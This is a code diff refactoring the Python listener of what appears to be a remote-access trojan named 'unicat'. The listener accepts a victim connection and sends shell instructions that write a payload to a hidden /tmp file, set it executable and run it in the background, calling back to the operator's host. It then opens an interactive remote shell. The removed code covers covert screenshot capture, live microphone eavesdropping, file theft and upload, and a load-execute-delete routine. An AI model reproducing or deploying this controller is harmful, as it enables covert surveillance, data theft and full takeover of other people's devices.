@@ -1,37 +1,55 @@
 #!/usr/bin/env python3
 
-I = '\033[1;77m[i] \033[0m'
-Q = '\033[1;77m[?] \033[0m'
-S = '\033[1;32m[+] \033[0m'
-W = '\033[1;33m[!] \033[0m'
-E = '\033[1;31m[-] \033[0m'
-G = '\033[1;34m[*] \033[0m'
-
-GREEN = '\033[0;33m'
-RESET = '\033[0m'
-
 import socket
 import struct
 import sys
 import os
 import pyaudio
+import importlib
 
 from time import sleep
 from datetime import datetime
 
+from core.handler import handler
+from core.badges import badges
+
+badges = badges()
+
 # List of commands without required output
 black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic', 'download', 'upload', 'load', 'say']
+multi_arguments = ['shell', 'exec', 'say']
 
-if len(sys.argv) != 3:
-    print("Usage: unicat.py <local_host> <local_port>")
-    sys.exit()
+def _get_module(mu, name, folderpath):
+    folderpath_list = folderpath.split(".")
+    for i in dir(mu):
+        if i == name:
+            pass
+            return getattr(mu, name)
+        else:
+            if i in folderpath_list:
+                i = getattr(mu, i)
+                return _get_module(i, name, folderpath)
 
-LHOST = sys.argv[1]
-LPORT = int(sys.argv[2])
+
+def import_modules(path):
+    modules = dict()
+    
+    for mod in os.listdir(path):
+        if mod == '__init__.py' or mod[-3:] != '.py':
+            continue
+        else:
+            md = path.replace("/", ".").replace("\\", ".") + "." + mod[:-3]
+            mt = __import__(md)
+            
+            m = _get_module(mt, mod[:-3], md)
+            m = m.UnicornModule(unicorn)
+            
+            modules[m.name] = m
+    return modules
 
 def craft_payload(LHOST, LPORT, target_system):
     if target_system in ["Linux", "macOS", "iOS"]:
-        print(G+"Sending "+target_system+" payload...")
+        print(badges.G + "Sending "+target_system+" payload...")
         if os.path.exists("data/payload/"+target_system+"/magic_unicorn.py"):
             f = open("data/payload/"+target_system+"/magic_unicorn.py", "rb")
             payload = f.read()
@@ -40,34 +58,14 @@ def craft_payload(LHOST, LPORT, target_system):
             "cat >/tmp/.magic_unicorn;"+\
             "chmod 777 /tmp/.magic_unicorn;"+\
             "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
-            print(G+"Executing "+target_system+" payload...")
+            print(badges.G + "Executing "+target_system+" payload...")
             return (instructions, payload)
         else:
-            print(E+"Failed to craft "+target_system+" payload!")
+            print(badges.E +"Failed to craft "+target_system+" payload!")
             sys.exit()
     else:
-        print(E+"Unrecognized target system!")
+        print(badges.E +"Unrecognized target system!")
         sys.exit()
-
-class handler:
-    def __init__(self,sock):
-        self.sock = sock
-    def send(self, data):
-        payloaded_packet = struct.pack('>I', len(data)) + data
-        self.sock.sendall(payloaded_packet)
-    def recv(self):
-        payloaded_packet_length = self.recvall(4)
-        if not payloaded_packet_length: return ""
-        payloaded_packet_length = struct.unpack('>I', payloaded_packet_length)[0]
-        return self.recvall(payloaded_packet_length)
-    def recvall(self, n):
-        payloaded_packet = "".encode("UTF-8")
-        while len(payloaded_packet) < n:
-            frame = self.sock.recv(n - len(payloaded_packet))
-            if not frame:
-                return None
-            payloaded_packet += frame
-        return payloaded_packet
 
 def help():
     print("")
@@ -96,202 +94,60 @@ def help():
     os.system("cat data/cmds/unicat_local_cmds.txt")
     print("")
 
-def screenshot(output_filename):
-    print(G+"Taking screenshot...")
-    unicorn.send("screenshot".encode("UTF-8"))
-    image = unicorn.recv()
-    f = open(output_filename, "wb")
-    print(G+"Saving to "+output_filename+"...")
-    f.write(image)
-    f.close()
-    print(S+"Saved to "+output_filename+"...")
-
-def listen_audio():
-    p = pyaudio.PyAudio()
-    CHUNK = 1024 * 4
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 2
-    RATE = 44100
-    stream = p.open(format=FORMAT,
-                    channels=CHANNELS,
-                    rate=RATE,
-                    output=True,
-                    frames_per_buffer=CHUNK)
-    unicorn.send("mic".encode("UTF-8"))
-    response = unicorn.recv()
-    if response == b"success":
-        print(G+"Listening...")
-        print(I+"Press Ctrl-C to stop.")
-        while True:
-            unicorn.send("continue".encode("UTF-8"))
-            try:
-                data = unicorn.recvall(4096)
-                stream.write(data)
-            except (KeyboardInterrupt, EOFError):
-                unicorn.send("break".encode("UTF-8"))
-                stream.stop_stream()
-                stream.close()
-                p.terminate()
-                return
-    else:
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        print(E+"Failed to listen!")
-        return
-
-def download(command):
-    files = ("".join(command.split("download")).strip()).split(" ")
-    if len(files) < 2:
-        print("Usage: download <input_file> <output_path>")
-        return
-    input_file = files[0]
-    output_file = files[1]
-    unicorn.send("download {}".format(input_file).encode("UTF-8"))
-    down = unicorn.recv().decode("UTF-8", "ignore")
-    if down == "true":
-        print(G+"Downloading {}...".format(output_file))
-        wf = open(output_file, "wb")
-        while True:
-            data = unicorn.recv()
-            if data == b"success":
-                break
-            elif data == b"fail":
-                wf.close()
-                os.remove(output_file)
-                print(E+"Failed to download!")
-                return
-            wf.write(data)
-        print(G+"Saving to {}...".format(output_file))
-        wf.close()
-        print(S+"Saved to {}!".format(output_file))
-    else:
-        print(down)
-
-def upload(command):
-    files = ("".join(command.split("upload")).strip()).split(" ")
-    if len(files) < 2:
-        print("Usage: upload <input_file> <output_path>")
-        return
-    input_file = files[0]
-    output_file = files[1]
-    if not os.path.isfile(input_file):
-        print(E+"Local file: "+output_file+": does not exist!")
-    else:
-        unicorn.send("upload {}".format(output_file).encode("UTF-8"))
-        print(G+"Uploading {}...".format(input_file))
-        with open(input_file, "rb") as wf:
-            for data in iter(lambda: wf.read(4100), b""):
-                try:
-                    unicorn.send(data)
-                except(KeyboardInterrupt,EOFError):
-                    wf.close()
-                    unicorn.send("fail".encode("UTF-8"))
-                    print(E+"Failed to upload!")
-                    return
-        unicorn.send("success".encode("UTF-8"))
-        print(G+"Saving to "+output_file+"...")
-        print(S+"Saved to "+output_file+"!")
-
-def openurl(command):
-    url = "".join(command.split("openurl")).strip()
-    if not url.strip():
-        print("Usage: openurl <url>")
-    else:
-        if not url.startswith(("http://","https://")):
-            url = "http://"+url
-        unicorn.send("openurl {}".format(url).encode("UTF-8"))
-
 def get_prompt_information():
-    unicorn.send("username".encode("UTF-8"))
+    username = ['username']
+    unicorn.send(str(username).encode("UTF-8"))
     username = unicorn.recv()
-    unicorn.send("hostname".encode("UTF-8"))
-    name = unicorn.recv()
-    return (username.decode("UTF-8", "ignore"), name.decode("UTF-8", "ignore"))
+    hostname = ['hostname']
+    unicorn.send(str(hostname).encode("UTF-8"))
+    hostname = unicorn.recv()
+    return (username.decode("UTF-8", "ignore"), hostname.decode("UTF-8", "ignore"))
 
 def shell():
     while True:
         try:
-            username, name = get_prompt_information()
-            command = str(input("({}{}@{}{})> ".format(GREEN, username, name, RESET)))
+            username, hostname = get_prompt_information()
+            command = str(input("({}{}@{}{})> ".format(badges.GREEN, username, hostname, badges.RESET)))
             while not command.strip():
-                command = str(input("({}{}@{}{})> ".format(GREEN, username, name, RESET)))
+                command = str(input("({}{}@{}{})> ".format(badges.GREEN, username, hostname, badges.RESET)))
             command = command.strip()
-            ui = command.split(" ")
-            if ui[0] == "help":
+            arguments = "".join(command.split(command.split(" ")[0])).strip()
+            command = command.split(" ")
+            if command[0] == "help":
                 help()
-            elif ui[0] == "download":
-                download(command)
-            elif ui[0] == "mic":
-                listen_audio()
-            elif ui[0] == "say":
-                if len(ui) < 2:
-                    print("Usage: say <message>")
-                else:
-                    unicorn.send(command.encode("UTF-8"))
-                    status = unicorn.recv()
-                    if status == b"success":
-                        sleep(5) # timeout
-                        print(S+"Done saying message!")
-                    else:
-                        print(E+"Failed to say message!")
-            elif ui[0] == "upload":
-                upload(command)
-            elif ui[0] == "screenshot":
-                output_filename = "".join(command.split("screenshot")).strip()
-                if not output_filename.strip():
-                    print("Usage: screenshot <output_path>")
-                else:
-                    screenshot(output_filename)
-            elif ui[0] == "exit":
-                print(G+"Cleaning up...")
+            elif command[0] == "exit":
+                print(badges.G + "Cleaning up...")
                 unicorn.send("exit".encode("UTF-8"))
                 c.shutdown(2)
                 c.close()
                 s.close()
                 sys.exit()
-            elif ui[0] == "load":
-                if len(ui) < 2:
-                    print("Usage: load <input_file> [arguments]")
-                else:
-                    print(G+"Sending payload...")
-                    upload("upload {}".format(ui[1]))
-                    if len(ui) > 2:
-                        instructions = \
-                        "chmod 777 ./"+ui[1]+";"+\
-                        "./"+ui[1]+" "+ui[2]+" 2>/dev/null &;"+\
-                        "rm ./"+ui[1]+"\n"
-                    else:
-                        instructions = \
-                        "chmod 777 ./"+ui[1]+";"+\
-                        "./"+ui[1]+" 2>/dev/null &;"+ \
-                        "rm ./"+ui[1]+"\n"
-                    print(G+"Executing payload...")
-                    unicorn.send("load {}".format(instructions).encode("UTF-8"))
-                    payload_output = unicorn.recv()
-                    print(payload_output.decode("UTF-8", "ignore"))
-                    print(S+"Payload executed!")
-            elif ui[0] == "exec":
-                local_command = "".join(command.split("exec")).strip()
-                if not local_command.strip():
+            elif command[0] == "exec":
+                if len(command) < 2:
                     print("Usage: exec <command>")
                 else:
-                    print(I+"exec:")
-                    os.system(local_command)
+                    print(badges.I + "exec:")
+                    os.system(arguments)
                     print("")
-            elif ui[0] == "openurl":
-                openurl(command)
-            elif ui[0] == "clear":
+            elif command[0] == "clear":
                 os.system("clear")
-            if not ui[0] in black_list:
-                unicorn.send(command.encode("UTF-8"))
+            else:
+                commands = import_modules("modules/"+target_system)
+                if command[0] in commands.keys():
+                    module = commands[command[0]]
+                    if len(command) < int(module.args):
+                        print(module.usage)
+                    else:
+                        module.run(arguments)
+            if not command[0] in black_list:
+                unicorn.send(str(command).encode("UTF-8"))
                 data = unicorn.recv()
                 if data.strip():
                     print(data.decode("UTF-8", "ignore"))
         except (KeyboardInterrupt, EOFError):
             print("")
         except socket.error:
-            print(E+"Connection refused!")
+            print(badges.E +"Connection refused!")
             c.close()
             s.close()
             sys.exit()
@@ -299,19 +155,19 @@ def shell():
             print(data)
             print("")
         except Exception as e:
-            print(E+"An error occurred: "+str(e)+"!")
+            print(badges.E +"An error occurred: "+str(e)+"!")
 
 def server(LHOST, LPORT, handler=handler):
-    global s, a, c, unicorn
+    global s, a, c, target_system, unicorn
     
-    print(G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
+    print(badges.G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
     try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((LHOST, LPORT))
         s.listen(1)
     except:
-        print(E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
+        print(badges.E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
         try: 
             s.close()
         except:
@@ -319,9 +175,9 @@ def server(LHOST, LPORT, handler=handler):
         sys.exit()
 
     try:
-        print(G + "Listening on port " + str(LPORT) + "...")
+        print(badges.G + "Listening on port " + str(LPORT) + "...")
         c, a = s.accept()
-        print(G + "Connecting to " + a[0] + "...")
+        print(badges.G + "Connecting to " + a[0] + "...")
 
         c.send("uname -p\n".encode())
         device_arch = c.recv(128).decode().strip()
@@ -343,7 +199,7 @@ def server(LHOST, LPORT, handler=handler):
         c.send(executable)
         c.close()
 
-        print(G + "Establishing connection...")
+        print(badges.G + "Establishing connection...")
         c, a = s.accept()
 
         unicorn = handler(c)
@@ -351,5 +207,3 @@ def server(LHOST, LPORT, handler=handler):
     except (KeyboardInterrupt, EOFError):
         print("")
         sys.exit()
-
-server(LHOST, LPORT)
